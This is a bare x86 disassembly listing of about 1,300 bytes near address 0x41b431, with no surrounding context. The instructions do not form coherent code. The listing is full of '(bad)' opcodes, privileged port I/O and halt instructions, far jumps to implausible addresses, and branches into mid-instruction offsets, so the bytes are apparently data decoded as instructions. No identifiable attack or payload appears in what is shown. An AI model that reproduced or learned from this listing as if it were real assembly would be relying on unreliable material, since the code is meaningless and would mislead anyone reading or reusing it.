  41b431:	lahf   
  41b432:	dec    eax
  41b433:	loop   0x41b3f2
  41b435:	(bad)  
  41b436:	loopne 0x41b472
  41b438:	dec    ecx
  41b439:	cld    
  41b43a:	push   ebx
  41b43b:	mov    eax,ds:0x7d7074c6
  41b440:	push   eax
  41b441:	or     DWORD PTR [edi+0x7],ecx
  41b444:	icebp  
  41b445:	xchg   esi,eax
  41b446:	test   DWORD PTR [ecx-0x2c],0x69d8fe74
  41b44d:	pushf  
  41b44e:	mov    ds:0xc536add5,al
  41b453:	jp     0x41b3e6
  41b455:	mov    edi,0xeeef124f
  41b45a:	inc    esi
  41b45b:	shr    BYTE PTR [eax+0x6f],0x83
  41b45f:	inc    ebp
  41b460:	daa    
  41b461:	pop    eax
  41b462:	and    BYTE PTR [ecx],cl
  41b464:	pop    ss
  41b465:	loopne 0x41b43b
  41b467:	scas   al,BYTE PTR es:[edi]
  41b468:	pop    esp
  41b469:	push   ss
  41b46a:	into   
  41b46b:	and    al,0x9a
  41b46d:	cli    
  41b46e:	or     ecx,esp
  41b470:	cmp    bl,bl
  41b472:	jb     0x41b40c
  41b474:	xchg   esi,eax
  41b475:	push   0xa49a9916
  41b47a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b47c:	push   edi
  41b47d:	sub    BYTE PTR [ebx+0x4b],0xd3
  41b481:	fnstsw WORD PTR [ecx]
  41b483:	push   ecx
  41b484:	out    dx,al
  41b485:	call   0x6a2:0x543e42a7
  41b48c:	cwde   
  41b48d:	rcl    ebp,0xf3
  41b490:	mov    ebp,0xcc788f5d
  41b495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b496:	out    dx,eax
  41b497:	int3   
  41b498:	(bad)  
  41b499:	ins    BYTE PTR es:[edi],dx
  41b49a:	std    
  41b49b:	xor    ebx,0x829627d4
  41b4a1:	in     eax,dx
  41b4a2:	sub    ah,BYTE PTR ds:0xe96e8a08
  41b4a8:	push   es
  41b4a9:	dec    edx
  41b4aa:	in     eax,0xc7
  41b4ac:	sub    dh,dl
  41b4ae:	push   cs
  41b4af:	xlat   BYTE PTR ds:[ebx]
  41b4b0:	ja     0x41b4a2
  41b4b2:	rol    ebp,cl
  41b4b4:	(bad)  
  41b4b5:	out    0xec,eax
  41b4b7:	hlt    
  41b4b8:	(bad)  
  41b4b9:	cmp    eax,0xbfc90455
  41b4be:	sbb    BYTE PTR [edx-0x1d],dh
  41b4c1:	pop    ds
  41b4c2:	cdq    
  41b4c3:	jae    0x41b470
  41b4c5:	mov    al,0xad
  41b4c7:	scas   al,BYTE PTR es:[edi]
  41b4c8:	stc    
  41b4c9:	xor    ebx,DWORD PTR [edx]
  41b4cb:	(bad)  
  41b4cc:	retf   0x9c49
  41b4cf:	xchg   BYTE PTR [esi-0x73],dl
  41b4d2:	ret    0xfd1d
  41b4d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4d6:	xor    cl,BYTE PTR [esi]
  41b4d8:	imul   eax,DWORD PTR [ecx+0x6b],0xffffffdc
  41b4dc:	sub    ecx,ebx
  41b4de:	inc    edx
  41b4df:	ss jmp 0x41b47f
  41b4e2:	jb     0x41b4fa
  41b4e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4e5:	mov    ebx,0xfad7d5e8
  41b4ea:	idiv   DWORD PTR [ebp+0xe]
  41b4ed:	shl    BYTE PTR [edx],0x24
  41b4f0:	dec    esi
  41b4f1:	(bad)  
  41b4f2:	call   0x50f25ff1
  41b4f7:	neg    DWORD PTR [edi]
  41b4f9:	cli    
  41b4fa:	mov    al,0xc
  41b4fc:	loop   0x41b55b
  41b4fe:	dec    edx
  41b4ff:	les    edx,FWORD PTR [eax-0x6a]
  41b502:	jecxz  0x41b4f2
  41b504:	push   esp
  41b505:	sbb    al,0x73
  41b507:	jno    0x41b547
  41b509:	jl     0x41b4ac
  41b50b:	loope  0x41b502
  41b50d:	push   ebp
  41b50e:	xchg   edx,eax
  41b50f:	ds loop 0x41b4ae
  41b512:	pop    ss
  41b513:	xchg   ah,ah
  41b515:	shr    ebx,cl
  41b517:	arpl   WORD PTR [ecx-0x510c13f],si
  41b51d:	sbb    esp,DWORD PTR [ebp+0x388f87c2]
  41b523:	popa   
  41b524:	and    eax,0xb8c7293
  41b529:	pop    esp
  41b52a:	pop    ebx
  41b52b:	lds    esi,FWORD PTR [ecx+0x70a6d545]
  41b531:	jg     0x41b589
  41b533:	sahf   
  41b534:	jmp    0xf8ec7d3d
  41b539:	retf   
  41b53a:	pop    edx
  41b53b:	and    al,0x76
  41b53d:	fistp  QWORD PTR [eax+0x51]
  41b540:	bound  ebp,QWORD PTR [ebx+0x271f34f0]
  41b546:	lea    ebx,[ebx-0x4]
  41b549:	xchg   edi,eax
  41b54a:	cmp    BYTE PTR [edx+0x4a],dh
  41b54d:	test   DWORD PTR [edi],ebx
  41b54f:	add    al,0xf8
  41b551:	and    edx,DWORD PTR [edx+0x51a9d72f]
  41b557:	pop    edx
  41b558:	mov    BYTE PTR [ecx-0x12],dl
  41b55b:	jg     0x41b55d
  41b55d:	jb     0x41b518
  41b55f:	mov    ch,0x96
  41b561:	mov    dh,0x50
  41b563:	(bad)  [edi+0x4fba6075]
  41b569:	cmp    edi,DWORD PTR [edx]
  41b56b:	hlt    
  41b56c:	es pushf 
  41b56e:	xlat   BYTE PTR ds:[ebx]
  41b56f:	aad    0x16
  41b571:	pop    es
  41b572:	mov    ebx,0x98fe4299
  41b577:	inc    ebx
  41b578:	adc    al,0xaa
  41b57a:	xor    ah,ch
  41b57c:	jecxz  0x41b569
  41b57e:	adc    DWORD PTR [eax+eiz*1-0x59],eax
  41b582:	xchg   edi,eax
  41b583:	or     dh,BYTE PTR [ebx]
  41b585:	ret    0xe2e4
  41b588:	mov    ds:0x158eaa98,al
  41b58d:	shl    DWORD PTR [esi],1
  41b58f:	dec    esi
  41b590:	test   al,0xc6
  41b593:	cdq    
  41b594:	int3   
  41b595:	imul   edx,ebp,0x7
  41b598:	mov    al,ds:0x99fded20
  41b59d:	mov    ch,0xa4
  41b59f:	and    eax,0x828bac44
  41b5a4:	out    dx,al
  41b5a5:	sbb    DWORD PTR [ebx+ebp*8+0x1c],esi
  41b5a9:	dec    ebp
  41b5aa:	mov    edi,0xe5a40d03
  41b5af:	in     eax,0xcf
  41b5b1:	imul   ebx,DWORD PTR ds:0x5e139a17,0x78af979f
  41b5bb:	retf   
  41b5bc:	add    BYTE PTR [ebx],cl
  41b5be:	sahf   
  41b5bf:	ins    BYTE PTR es:[edi],dx
  41b5c0:	imul   ebp,esi,0x31
  41b5c3:	dec    ebx
  41b5c4:	inc    ebx
  41b5c5:	out    dx,al
  41b5c6:	jno    0x41b637
  41b5c8:	das    
  41b5c9:	and    BYTE PTR [esi+0x50],bl
  41b5cc:	jo     0x41b5bf
  41b5ce:	inc    esp
  41b5cf:	or     al,al
  41b5d1:	sbb    BYTE PTR [ebp+edi*4-0x19],bh
  41b5d5:	aam    0x90
  41b5d7:	dec    esp
  41b5d8:	push   edx
  41b5d9:	retf   0xa1b6
  41b5dc:	sti    
  41b5dd:	lods   al,BYTE PTR ds:[esi]
  41b5de:	xchg   ebx,eax
  41b5df:	scas   eax,DWORD PTR es:[edi]
  41b5e0:	cld    
  41b5e1:	test   al,0x54
  41b5e3:	pop    ecx
  41b5e4:	inc    esi
  41b5e5:	lea    edx,[ebp+edx*2-0x50]
  41b5e9:	xor    al,BYTE PTR [edx-0x5c92125b]
  41b5ef:	std    
  41b5f0:	scas   eax,DWORD PTR es:[edi]
  41b5f1:	jge    0x41b65a
  41b5f3:	dec    esp
  41b5f4:	sbb    BYTE PTR [ebx+eax*8],dh
  41b5f7:	xchg   DWORD PTR [eax],ebp
  41b5f9:	cwde   
  41b5fa:	jno    0x41b5e9
  41b5fc:	test   DWORD PTR fs:[ecx+0x34016bc],ecx
  41b603:	dec    esp
  41b604:	xchg   ebx,eax
  41b605:	test   BYTE PTR [esi],bl
  41b607:	and    DWORD PTR [eax+0x56],ebp
  41b60a:	pop    eax
  41b60b:	cmp    bl,BYTE PTR [ebp+0x1e]
  41b60e:	add    al,0xbc
  41b610:	jecxz  0x41b5db
  41b612:	into   
  41b613:	sahf   
  41b614:	shl    BYTE PTR [edi+0x1d],0x91
  41b618:	mov    ebx,0x8ed112db
  41b61d:	pusha  
  41b61e:	aas    
  41b61f:	stc    
  41b620:	inc    esp
  41b621:	jbe    0x41b5ec
  41b623:	sbb    bl,0xe0
  41b626:	(bad)  
  41b627:	lea    ebp,[eax-0x19]
  41b62a:	aaa    
  41b62b:	lods   al,BYTE PTR ds:[esi]
  41b62c:	loope  0x41b655
  41b62e:	cli    
  41b62f:	mov    al,ds:0x9a6d6108
  41b634:	aad    0x78
  41b636:	enter  0x4978,0xff
  41b63a:	add    esi,DWORD PTR [ecx-0x47]
  41b63d:	jno    0x41b63b
  41b63f:	or     eax,0x1a18e481
  41b644:	mov    ds:0x6160d18c,eax
  41b649:	mov    al,0xe4
  41b64b:	ja     0x41b6af
  41b64d:	inc    esp
  41b64e:	and    al,0x5f
  41b650:	es push ebx
  41b652:	mov    ch,0x9c
  41b654:	add    ebp,DWORD PTR [eax+eiz*8-0x2f]
  41b658:	push   ecx
  41b659:	mov    al,ds:0xbf0cbb9a
  41b65e:	repz sbb ebp,DWORD PTR [ecx-0x5d]
  41b662:	pusha  
  41b663:	and    eax,0xd91b51
  41b668:	and    edi,DWORD PTR [ebx]
  41b66a:	push   edi
  41b66b:	push   cs
  41b66c:	push   ebp
  41b66d:	push   ds
  41b66e:	(bad)  
  41b670:	pop    es
  41b671:	shl    bh,1
  41b673:	mov    DWORD PTR [ebp+0x1b],eax
  41b676:	or     BYTE PTR [esi-0x3d953b5a],bh
  41b67c:	adc    BYTE PTR [esi+0x5ecc1130],0x4f
  41b683:	inc    ebp
  41b684:	xor    BYTE PTR [edx+0x5],al
  41b687:	mov    esi,0x7019c92b
  41b68c:	adc    eax,0xd10847af
  41b691:	cmp    al,0x15
  41b693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b694:	adc    DWORD PTR [esi],eax
  41b696:	jns    0x41b672
  41b698:	mov    ecx,0xe3c8fea1
  41b69d:	in     eax,0xce
  41b69f:	cmp    eax,0x6e3dc27c
  41b6a4:	jge    0x41b6ba
  41b6a6:	iret   
  41b6a7:	xchg   DWORD PTR [eax-0x28d50ba0],esi
  41b6ad:	ret    
  41b6ae:	sti    
  41b6af:	int3   
  41b6b0:	sbb    eax,0xfb6052e3
  41b6b5:	into   
  41b6b6:	adc    ch,BYTE PTR [ebp+0x50c251de]
  41b6bc:	scas   al,BYTE PTR es:[edi]
  41b6bd:	std    
  41b6be:	push   es
  41b6bf:	in     al,dx
  41b6c0:	push   cs
  41b6c1:	(bad)  
  41b6c2:	cmp    al,BYTE PTR [ecx]
  41b6c4:	shl    DWORD PTR [ebx-0x5e717769],cl
  41b6ca:	dec    ecx
  41b6cb:	data16 stc 
  41b6cd:	fs cwde 
  41b6cf:	scas   al,BYTE PTR es:[edi]
  41b6d0:	mov    ebx,0x8c8037b2
  41b6d5:	add    ah,bl
  41b6d7:	or     cl,al
  41b6d9:	sub    edx,ebp
  41b6db:	jecxz  0x41b6c7
  41b6dd:	adc    cl,BYTE PTR [esi+0x25ac89e5]
  41b6e3:	add    al,0xb5
  41b6e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6e6:	ret    0xa76b
  41b6e9:	cli    
  41b6ea:	mov    ecx,0x4703a164
  41b6ef:	xchg   BYTE PTR [esp+ebp*2-0x26],bh
  41b6f3:	div    DWORD PTR [ebp+0x1b]
  41b6f6:	loop   0x41b73b
  41b6f8:	xchg   edx,eax
  41b6f9:	mov    eax,0xe932c61e
  41b6fe:	repz call 0x190b:0x631fb364
  41b706:	dec    edx
  41b707:	into   
  41b708:	pop    edi
  41b709:	int    0x9c
  41b70b:	push   cs
  41b70c:	sbb    BYTE PTR [ebx-0xcb8dff0],bl
  41b712:	dec    ecx
  41b713:	nop
  41b714:	leave  
  41b715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b716:	push   ecx
  41b717:	mov    dh,0x11
  41b719:	dec    eax
  41b71a:	mov    dh,BYTE PTR [ebp-0x7723907e]
  41b720:	xor    eax,ebx
  41b722:	aas    
  41b723:	sbb    eax,0xd8a9693b
  41b728:	ret    
  41b729:	jnp    0x41b744
  41b72b:	inc    edx
  41b72c:	cld    
  41b72d:	pop    edi
  41b72e:	cmp    al,0xc6
  41b730:	stos   BYTE PTR es:[edi],al
  41b731:	cli    
  41b732:	je     0x41b6d2
  41b734:	stos   DWORD PTR es:[edi],eax
  41b735:	aad    0xc7
  41b737:	inc    eax
  41b738:	push   ebx
  41b739:	or     BYTE PTR [edx-0x7b],ch
  41b73c:	rol    BYTE PTR [ebp-0x16],1
  41b73f:	xchg   ebp,eax
  41b740:	add    BYTE PTR [esi-0x1d614787],bl
  41b746:	iret   
  41b747:	jnp    0x41b797
  41b749:	jno    0x41b7b2
  41b74b:	std    
  41b74c:	arpl   bx,si
  41b74e:	pop    ecx
  41b74f:	ins    BYTE PTR es:[di],dx
  41b751:	xor    edi,DWORD PTR ss:[ecx+0x302eb7d9]
  41b758:	imul   esp,DWORD PTR [eax+0x18],0xd96571c4
  41b75f:	jmp    0x88:0x441f04fa
  41b766:	repz jae 0x41b777
  41b769:	jmp    0xbf447fba
  41b76e:	repz jae 0x41b7d2
  41b771:	jp     0x41b7a9
  41b773:	fistp  WORD PTR [ebx-0x67bb9fc6]
  41b779:	js     0x41b79b
  41b77b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b77c:	stc    
  41b77d:	ins    DWORD PTR es:[edi],dx
  41b77e:	shr    edx,1
  41b780:	mov    ch,0x9c
  41b782:	cmp    ecx,DWORD PTR [edx]
  41b784:	fstp   DWORD PTR [eax-0x6adf856f]
  41b78a:	and    edx,esi
  41b78c:	ds xchg ch,cl
  41b78f:	jge    0x41b7ff
  41b791:	sahf   
  41b792:	inc    eax
  41b793:	or     al,0xb4
  41b795:	push   eax
  41b796:	lahf   
  41b797:	(bad)  
  41b798:	sbb    DWORD PTR [edi],edi
  41b79a:	fwait
  41b79b:	outs   dx,DWORD PTR ds:[esi]
  41b79c:	punpckhdq mm2,QWORD PTR [edi]
  41b79f:	xlat   BYTE PTR ds:[ebx]
  41b7a0:	iret   
  41b7a1:	sbb    DWORD PTR [eax+0x4b],edx
  41b7a4:	pop    es
  41b7a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7a6:	push   0x657e11c9
  41b7ab:	sub    al,0x99
  41b7ad:	adc    al,0xa3
  41b7af:	(bad)  
  41b7b0:	enter  0x7a4b,0x4e
  41b7b4:	pop    es
  41b7b5:	mov    edx,0xf4c77a9
  41b7ba:	pop    ecx
  41b7bb:	inc    esp
  41b7bc:	pop    edx
  41b7bd:	mov    eax,DWORD PTR [edi]
  41b7bf:	cmp    edx,DWORD PTR [edx-0xaa0ea65]
  41b7c5:	jl     0x41b7ea
  41b7c7:	pop    ebx
  41b7c8:	iret   
  41b7c9:	repnz cmp DWORD PTR [ecx+ebp*4-0x3e],ebx
  41b7ce:	fiadd  WORD PTR [ebp+0x38d2053b]
  41b7d4:	mov    dh,0xec
  41b7d6:	mov    dh,0xab
  41b7d8:	cmp    ebp,esp
  41b7da:	add    eax,0xc7e53fee
  41b7df:	aam    0xd0
  41b7e1:	and    esi,esi
  41b7e3:	dec    edi
  41b7e4:	dec    ecx
  41b7e5:	aaa    
  41b7e6:	mov    ah,0xa7
  41b7e8:	scas   eax,DWORD PTR es:[edi]
  41b7e9:	cmc    
  41b7ea:	dec    ebx
  41b7eb:	mov    ebp,0x69b3755b
  41b7f0:	das    
  41b7f1:	pop    ebp
  41b7f2:	jo     0x41b823
  41b7f4:	dec    esi
  41b7f5:	retf   0x6647
  41b7f8:	or     DWORD PTR [ecx-0x7a2ffc02],ebp
  41b7fe:	mov    fs,WORD PTR [ecx]
  41b800:	pop    ds
  41b801:	pusha  
  41b802:	jbe    0x41b784
  41b804:	aas    
  41b805:	xor    DWORD PTR ds:0x6a55f403,esi
  41b80b:	mov    ebx,0xba79f005
  41b810:	cmp    esi,0x3f9f6f58
  41b816:	and    bl,BYTE PTR [ebp-0x1]
  41b819:	and    dl,BYTE PTR [edx+ebp*8-0x55]
  41b81d:	aam    0x8d
  41b81f:	mov    BYTE PTR [eax+0x53d0dfd2],cl
  41b825:	nop
  41b826:	(bad)  
  41b827:	(bad)  
  41b829:	cs (bad) 
  41b82b:	dec    esp
  41b82c:	adc    bl,BYTE PTR [edi-0x1618927c]
  41b832:	mov    bl,0xae
  41b834:	and    bl,dl
  41b836:	retf   
  41b837:	test   eax,edx
  41b839:	or     eax,0x746cd7b6
  41b83e:	inc    ecx
  41b83f:	inc    eax
  41b840:	inc    ebx
  41b842:	fadd   st(5),st
  41b844:	mov    ds:0x97ec4cdd,al
  41b849:	ja     0x41b832
  41b84b:	push   esp
  41b84c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b84d:	cwde   
  41b84e:	mov    ds:0xe33f895f,al
  41b853:	xchg   DWORD PTR [esi-0x6520d21d],ebp
  41b859:	xor    cl,BYTE PTR [eax+0x5b0fb1ad]
  41b85f:	pop    ss
  41b860:	pop    ds
  41b861:	ja     0x41b874
  41b863:	ja     0x41b863
  41b865:	xchg   ebp,eax
  41b866:	pop    es
  41b867:	in     eax,dx
  41b868:	test   eax,0xbc2fcfc8
  41b86d:	and    ecx,0x4a
  41b870:	aam    0x8b
  41b872:	and    cl,BYTE PTR [ecx+ebx*1]
  41b875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b876:	stos   DWORD PTR es:[edi],eax
  41b877:	jg     0x41b8a2
  41b879:	outs   dx,BYTE PTR ds:[esi]
  41b87a:	pop    esp
  41b87b:	cwde   
  41b87c:	sub    eax,0xff8a2de1
  41b881:	cmp    BYTE PTR [edx+eiz*1],cl
  41b884:	jg     0x41b834
  41b886:	(bad)  
  41b887:	pop    es
  41b888:	add    DWORD PTR [eax],esp
  41b88a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b88b:	or     al,BYTE PTR [eax+0x568f87f]
  41b891:	ja     0x41b83c
  41b893:	lds    ebp,FWORD PTR [ecx-0x3b]
  41b896:	cmp    DWORD PTR [eax+ebp*2],esi
  41b899:	out    0x73,al
  41b89b:	sub    al,0x4e
  41b89d:	and    DWORD PTR [ecx-0x3bf5725c],esp
  41b8a3:	jp     0x41b857
  41b8a5:	and    BYTE PTR [edx],0x74
  41b8a8:	xchg   ecx,eax
  41b8a9:	add    ah,ch
  41b8ab:	fnstsw WORD PTR [ecx+0x7b]
  41b8ae:	cli    
  41b8af:	mov    ah,0x5f
  41b8b1:	leave  
  41b8b2:	mov    ecx,0x6f6cd3c9
  41b8b7:	mov    ebp,0xc89a9276
  41b8bc:	lods   al,BYTE PTR ds:[esi]
  41b8bd:	add    eax,DWORD PTR [ebx]
  41b8bf:	fdiv   st,st(7)
  41b8c1:	add    BYTE PTR [ebp+0x59],dl
  41b8c4:	push   0x14
  41b8c6:	push   edi
  41b8c7:	pop    ecx
  41b8c8:	repnz inc ebx
  41b8ca:	pop    edx
  41b8cb:	inc    ebp
  41b8cc:	push   ecx
  41b8cd:	jp     0x41b910
  41b8cf:	push   ebx
  41b8d0:	cmp    DWORD PTR [ecx-0x30],edi
  41b8d3:	adc    al,0x9a
  41b8d5:	std    
  41b8d6:	jecxz  0x41b8f2
  41b8d8:	bound  edi,QWORD PTR [edx-0xc8f9134]
  41b8de:	icebp  
  41b8df:	mov    ah,0xc6
  41b8e1:	aaa    
  41b8e2:	and    cl,BYTE PTR [esi]
  41b8e4:	out    dx,eax
  41b8e5:	and    DWORD PTR [ebx-0x78],ecx
  41b8e8:	jb     0x41b916
  41b8ea:	cs sti 
  41b8ec:	leave  
  41b8ed:	mov    DWORD PTR [esi],esi
  41b8ef:	sar    DWORD PTR [edi+0x58caed28],cl
  41b8f5:	mov    cl,0xd6
  41b8f7:	es pop edx
  41b8f9:	ret    
  41b8fa:	addr16 es (bad) 
  41b8fe:	jo     0x41b92b
  41b900:	in     eax,dx
  41b901:	jg     0x41b8c9
  41b903:	mov    ah,cl
  41b905:	ins    BYTE PTR es:[edi],dx
  41b906:	cli    
  41b907:	mov    bl,0x61
  41b909:	cmp    ecx,DWORD PTR [eax]
  41b90b:	or     bh,BYTE PTR [ebx-0xf]
  41b90e:	fsubp  st(1),st
  41b910:	idiv   ebp
  41b912:	fistp  QWORD PTR [edi]
  41b914:	int    0xf1
  41b916:	repnz clc 
  41b918:	sbb    eax,0x9b2cb442
  41b91d:	cmp    eax,0xf8d1b26c
  41b922:	fsub   QWORD PTR [ebp+0x5bff43b6]
  41b928:	or     DWORD PTR [ebp-0x13],edi
  41b92b:	ret    0x4c80
  41b92e:	mov    ecx,0x9c0e104f
  41b933:	push   0xf
  41b935:	sbb    al,0x67
  41b937:	out    dx,eax
  41b938:	push   esi
  41b939:	pop    edx
  41b93a:	clc    
  41b93b:	call   0xcebe:0x7dbf7b5
  41b942:	add    BYTE PTR [ebp+0x2],0x67
  41b946:	lds    ebp,FWORD PTR [ebx-0x73]
  41b949:	ret    0xf12c
  41b94c:	adc    al,0xe
  41b94e:	lahf   
  41b94f:	daa    
  41b950:	hlt    
  41b951:	je     0x41b970
  41b953:	mov    es,WORD PTR [edx]
  41b955:	or     eax,0x2ba180f5
  41b95a:	cmp    DWORD PTR [eax+0x595fb896],edi
  41b960:	leave  
  41b961:	lea    ecx,[ecx]
  41b963:	ss jmp 0x41b952
  41b966:	jns    0x41b911
  41b968:	cmp    BYTE PTR [edi],0xd6
  41b96b:	inc    esp
  41b96c:	sar    DWORD PTR [eax],cl
  41b96e:	cmp    esi,DWORD PTR [esi+0x8]
  41b971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b972:	cwde   
  41b973:	mov    dl,0x75
  41b975:	sub    ebx,DWORD PTR [eax]
  41b977:	les    eax,FWORD PTR [edi+0x61f71cfb]
  41b97d:	mov    al,0x12
  41b97f:	add    eax,0xe807f38a
  41b984:	dec    ebp
  41b985:	push   ecx
  41b986:	ins    DWORD PTR es:[edi],dx
  41b987:	dec    esi
  41b988:	fnstcw WORD PTR [ebp-0x669d3498]
  41b98e:	sbb    esi,DWORD PTR [ecx+0x19]
  41b991:	mov    es,WORD PTR [edx-0x6a]
  41b994:	xor    eax,0x6f2f69ef
  41b999:	out    0xcf,eax
  41b99b:	ja     0x41b9fc
  41b99d:	inc    esp
  41b99e:	addr16 (bad) 
  41b9a0:	jnp    0x41b939
  41b9a2:	mov    cl,0xcc
  41b9a4:	outs   dx,DWORD PTR ds:[esi]
  41b9a5:	test   al,0xa2
  41b9a7:	rcl    BYTE PTR [edx+edi*4],0x61
  41b9ab:	or     eax,0x3643e2d3
  41b9b0:	std    
  41b9b1:	mov    al,0xfc
  41b9b3:	rcr    BYTE PTR [edi+0x1],0x4a
  41b9b7:	pop    edi
  41b9b8:	dec    ecx
  41b9b9:	xor    DWORD PTR [eax+0x5fe109e2],edi
  41b9bf:	xor    ecx,0x18b2eb84
  41b9c5:	mov    al,0x43
  41b9c7:	mul    BYTE PTR [edi+0x1a]
  41b9ca:	aaa    
  41b9cb:	pop    ss
  41b9cc:	(bad)  
  41b9cd:	jg     0x41b99e
  41b9cf:	sar    bl,1
  41b9d1:	xlat   BYTE PTR ds:[ebx]
  41b9d2:	aad    0x59
  41b9d4:	mov    ah,0x19
  41b9d6:	pusha  
  41b9d7:	push   ebx
  41b9d8:	mov    ?,ecx
  41b9da:	je     0x41ba45
  41b9dc:	xor    BYTE PTR [esi+ebp*8+0x4ec460aa],bh
  41b9e3:	adc    bh,BYTE PTR [ebp-0x9deacf0]
  41b9e9:	xor    ah,bh
  41b9eb:	xchg   BYTE PTR [ebp+0x441b1636],ch
  41b9f1:	and    al,0x2a
  41b9f3:	ret    
  41b9f4:	push   ebp
  41b9f5:	inc    ecx
  41b9f6:	cmp    esp,ebp
  41b9f8:	mov    al,0x71
  41b9fa:	aam    0x6
  41b9fc:	rcl    DWORD PTR [esi-0x7f5f446],0x8a
  41ba03:	test   DWORD PTR [ecx],esi
  41ba05:	mov    edx,0x5a703a2b
  41ba0a:	les    eax,FWORD PTR [ebx+0x2fa2d65b]
  41ba10:	imul   edi,esp,0x572eb013
  41ba16:	mov    ebx,0x7e87c135
  41ba1b:	dec    edx
  41ba1c:	mov    al,0x2
  41ba1e:	shl    BYTE PTR [edi-0x4a7c19ff],0x2e
  41ba25:	jno    0x41ba4e
  41ba27:	mov    ch,0x9a
  41ba29:	dec    eax
  41ba2a:	ss pop ebp
  41ba2c:	jo     0x41ba43
  41ba2e:	xchg   edi,eax
  41ba2f:	mov    cl,cl
  41ba31:	repnz add ecx,DWORD PTR [esi+0x7d5a9e8]
  41ba38:	(bad)  
  41ba39:	lea    edi,[eax+0x54]
  41ba3c:	sar    BYTE PTR [esi-0x1df6e291],cl
  41ba42:	cli    
  41ba43:	icebp  
  41ba44:	stc    
  41ba45:	cmp    ebp,DWORD PTR [edx+eax*1+0x493da0a6]
  41ba4c:	out    0xb2,al
  41ba4e:	cmp    DWORD PTR [esi+0x41],ecx
  41ba51:	lea    edi,[eax]
  41ba53:	cmp    eax,0xda633cf6
  41ba58:	jbe    0x41b9e2
  41ba5a:	loopne 0x41ba18
  41ba5c:	sub    al,0x2b
  41ba5e:	(bad)
  41ba61:	push   ecx
  41ba62:	sbb    edi,DWORD PTR [ebx-0x23b852ed]
  41ba68:	xor    DWORD PTR [ebx-0x81831b],esp
  41ba6e:	sub    al,0xad
  41ba70:	push   es
  41ba71:	aaa    
  41ba72:	retf   
  41ba73:	hlt    
  41ba74:	xor    DWORD PTR [edx-0x663e2af1],0xb
  41ba7b:	push   edi
  41ba7c:	stos   BYTE PTR es:[edi],al
  41ba7d:	int3   
  41ba7e:	adc    esi,0xffffffc5
  41ba81:	xor    DWORD PTR [edi],esi
  41ba83:	jle    0x41ba54
  41ba85:	mov    ds:0x6d56c3df,eax
  41ba8a:	jbe    0x41ba6e
  41ba8c:	adc    esp,edx
  41ba8e:	lods   eax,DWORD PTR ds:[esi]
  41ba8f:	mov    ecx,0xaa295abc
  41ba94:	call   FWORD PTR [ebx]
  41ba96:	inc    ecx
  41ba97:	daa    
  41ba98:	lds    esp,FWORD PTR [eax+0x2a]
  41ba9b:	mov    eax,0x6410c5a0
  41baa0:	mov    ecx,0xa86924ef
  41baa5:	mov    ?,WORD PTR [edx]
  41baa7:	sub    esp,ecx
  41baa9:	mov    ebx,0x8e3f01f4
  41baae:	push   ecx
  41baaf:	pop    edi
  41bab0:	inc    ebp
  41bab1:	sar    DWORD PTR [edi-0x19b1419a],0x9d
  41bab8:	pop    edi
  41bab9:	mov    esi,0x53c82d8f
  41babe:	mov    cl,0x31
  41bac0:	lods   eax,DWORD PTR ds:[esi]
  41bac1:	xor    cl,al
  41bac3:	sub    ch,BYTE PTR [ebx]
  41bac5:	push   es
  41bac6:	stos   DWORD PTR es:[edi],eax
  41bac7:	retf   
  41bac8:	or     eax,0x3d6ccc92
  41bacd:	inc    ecx
  41bace:	leave  
  41bacf:	xor    BYTE PTR [edx-0x69],ch
  41bad2:	into   
  41bad3:	stc    
  41bad4:	and    ebx,edi
  41bad6:	push   eax
  41bad7:	shr    BYTE PTR [ebp+0x4f29f843],0xdd
  41bade:	add    bl,BYTE PTR [ebx-0x635db8c2]
  41bae4:	adc    al,BYTE PTR [edi-0x68]
  41bae7:	js     0x41bac3
  41bae9:	into   
  41baea:	mov    esp,0xc7f5ddff
  41baef:	inc    edi
  41baf0:	daa    
  41baf1:	mov    cl,BYTE PTR [esi]
  41baf3:	jecxz  0x41bb4f
  41baf5:	sub    DWORD PTR [ebx+0x6f],esp
  41baf8:	rol    BYTE PTR [ebp+0x5f],1
  41bafb:	repnz cmp BYTE PTR [eax-0x4],0x51
  41bb00:	sub    BYTE PTR [ecx+0x2d],ah
  41bb03:	cmc    
  41bb04:	mov    al,0xf5
  41bb06:	xor    edx,DWORD PTR [ebp-0x71]
  41bb09:	in     eax,dx
  41bb0a:	inc    esp
  41bb0b:	fisubr WORD PTR [ecx-0x34]
  41bb0e:	inc    esp
  41bb0f:	push   ecx
  41bb10:	fdivr  DWORD PTR [edi]
  41bb12:	ror    ch,1
  41bb14:	push   ds
  41bb15:	hlt    
  41bb16:	xchg   ecx,eax
  41bb17:	inc    edi
  41bb18:	add    ch,ah
  41bb1a:	push   es
  41bb1b:	sbb    eax,0x4d6f615e
  41bb20:	int    0xba
  41bb22:	lods   al,BYTE PTR ds:[esi]
  41bb23:	ret    0x6ed6
  41bb26:	(bad)
  41bb29:	aam    0x9e
  41bb2b:	loope  0x41bb72
  41bb2d:	(bad)  
  41bb2e:	out    dx,al
  41bb2f:	sar    BYTE PTR [ebp-0x47],0x9
  41bb33:	inc    edi
  41bb34:	xchg   ecx,eax
  41bb35:	xchg   BYTE PTR [eax],bh
  41bb37:	and    ch,bh
  41bb39:	xor    DWORD PTR [edi],0xd93fe64f
  41bb3f:	in     al,dx
  41bb40:	loope  0x41bb5d
  41bb42:	jmp    0x41bb12
  41bb44:	std    
  41bb45:	inc    edx
  41bb46:	aaa    
  41bb47:	retf   
  41bb48:	mov    eax,0xeccd7e3f
  41bb4d:	mov    dl,0xdf
  41bb4f:	iret   
  41bb50:	test   ebp,esi
  41bb52:	sbb    al,0x8c
  41bb54:	mov    ebp,ecx
  41bb56:	add    ebx,edx
